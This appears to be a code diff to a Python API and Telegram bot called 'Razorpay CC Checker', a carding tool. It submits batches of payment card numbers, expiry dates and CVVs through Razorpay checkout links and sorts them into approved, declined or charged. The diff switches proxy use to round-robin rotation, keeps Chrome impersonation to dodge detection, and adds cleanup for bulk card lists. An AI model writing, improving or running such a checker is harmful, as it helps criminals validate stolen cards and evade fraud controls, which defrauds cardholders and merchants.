@@ -52,7 +52,7 @@ url_index = 0
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-api_app = FastAPI(title="Razorpay CC Checker API", version="20.0")
+api_app = FastAPI(title="Razorpay CC Checker API", version="21.0")
 
 class CardRequest(BaseModel):
     cc: str
@@ -78,12 +78,9 @@ def format_proxy(raw):
 
     parts = raw.split(":")
     if len(parts) == 4:
-        # Check karo ki port kis position par hai taaki order pata chale
         if parts[1].isdigit() and int(parts[1]) < 65536:
-            # Format: host:port:user:pass -> http://user:pass@host:port
             return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
         elif parts[3].isdigit() and int(parts[3]) < 65536:
-            # Format: user:pass:host:port -> http://user:pass@host:port
             return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
         else:
             return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
@@ -166,6 +163,7 @@ async def fetch_dynamic_builds(session, proxy_url):
         return "9cb57fdf457e44eac4384e182f925070ff5488d9", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
 
 async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_callback=None):
+    global proxy_index
     if not RAW_PROXIES:
         return {"status": "error", "response": "No proxies added! Use /proxy first.", "proxy": "NONE"}
 
@@ -195,9 +193,11 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
     max_attempts = min(len(active_pool), 3)
     
     for _ in range(max_attempts):
-        current_raw_proxy = random.choice(active_pool)
-        current_proxy = format_proxy(current_raw_proxy)
+        # Strict Sequential Round-Robin Proxy Rotation
+        current_raw_proxy = active_pool[proxy_index % len(active_pool)]
+        proxy_index += 1
         
+        current_proxy = format_proxy(current_raw_proxy)
         if not current_proxy:
             continue
 
@@ -206,7 +206,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
         site_name = target_url.split("//")[-1].split("/")[0][:15]
 
         try:
-            await notify(f"({proxy_short})", f"🌐 Hit Site: {site_name}", "Connecting...")
+            await notify(f"({proxy_short})", f"🌐 Hit: {site_name}", "Connecting...")
             
             async with AsyncSession(impersonate="chrome120") as session:
                 
@@ -241,7 +241,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 if not link_id:
                     raise Exception("Link ID missing")
 
-                await notify(f"({proxy_short})", "📦 Parsed JSON/Key", "Creating Order...")
+                await notify(f"({proxy_short})", "📦 Parsed JSON", "Creating Order...")
                 keyless_hdr = parsed.get("keyless_header", "")
 
                 BUILD, BUILD_V1 = await fetch_dynamic_builds(session, current_proxy)
@@ -265,7 +265,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
                 currency = order_obj.get("currency", "INR")
 
-                await notify(f"({proxy_short})", "🛒 Order Created!", "Getting Token...")
+                await notify(f"({proxy_short})", "🛒 Order Created", "Getting Token...")
 
                 token_params = {
                     "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
@@ -283,7 +283,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 session_token = token_match.group(1)
                 referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"
 
-                await notify(f"({proxy_short})", "🔑 Session Token Got", "Submitting CC...")
+                await notify(f"({proxy_short})", "🔑 Token Got", "Submitting CC...")
 
                 form_data = {
                     "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
@@ -317,13 +317,13 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                     
                     desc_lower = err_desc.lower()
                     if any(k in desc_lower for k in ["insufficient account balance", "insufficient funds", "limit"]) or "incorrect_cvv" in err_reason.lower():
-                        await notify(f"({proxy_short})", "⚡ Gateway Parsed", f"Approved: {reason_full}")
+                        await notify(f"({proxy_short})", "⚡ Gateway", f"Approved: {reason_full}")
                         return {"status": "approved", "response": reason_full, "proxy": proxy_short}
                     
-                    await notify(f"({proxy_short})", "⚡ Gateway Parsed", f"Declined: {reason_full}")
+                    await notify(f"({proxy_short})", "⚡ Gateway", f"Declined: {reason_full}")
                     return {"status": "declined", "response": reason_full, "proxy": proxy_short}
 
-                await notify(f"({proxy_short})", "⚡ Gateway Parsed", "Charged Successfully!")
+                await notify(f"({proxy_short})", "⚡ Gateway", "Charged Successfully!")
                 return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}
 
         except Exception as e:
@@ -493,8 +493,11 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for sep in ["|", "/", " "]:
                 p = line.split(sep)
                 if len(p) >= 4:
-                    cards.append((p[0], p[1], p[2], p[3]))
-                    break
+                    # Clean cc digits to prevent corruption
+                    c_num = ''.join(filter(str.isdigit, p[0]))
+                    if len(c_num) >= 12:
+                        cards.append((c_num, p[1].strip(), p[2].strip(), p[3].strip()))
+                        break
     except Exception as e:
         await status_msg.edit_text(f"⚠️ Error reading file: {e}")
         return
@@ -509,7 +512,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = f"@{update.effective_user.username}" if update.effective_user.username else "User"
 
     for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
-        masked_cc = f"{cc[:6]}******{cc[-4:]}"
+        masked_cc = f"{cc[:6]}******{cc[-4:]}" if len(cc) >= 10 else "************"
         
         async def update_screen(proxy_st, api_st, gw_resp):
             nonlocal current_proxy_status, current_api_status, current_gateway_response
@@ -518,9 +521,10 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             current_gateway_response = gw_resp
             time_elapsed = int(time.time() - start_time)
             
+            # Clean, wide, balanced UI Console Box layout
             console_text = (
                 f"╔════════════════════════════════════╗\n"
-                f"║      🔥 RAZORPAY UHQ CHECKER       🔥      ║\n"
+                f"║       🔥 RAZORPAY UHQ CHECKER      🔥      ║\n"
                 f"╠════════════════════════════════════╣\n"
                 f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                 f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
@@ -601,8 +605,10 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
     for sep in ["|", "/", " "]:
         p = raw.split(sep)
         if len(p) >= 4:
-            parts = p
-            break
+            c_num = ''.join(filter(str.isdigit, p[0]))
+            if len(c_num) >= 12:
+                parts = (c_num, p[1].strip(), p[2].strip(), p[3].strip())
+                break
 
     if not parts: return
 
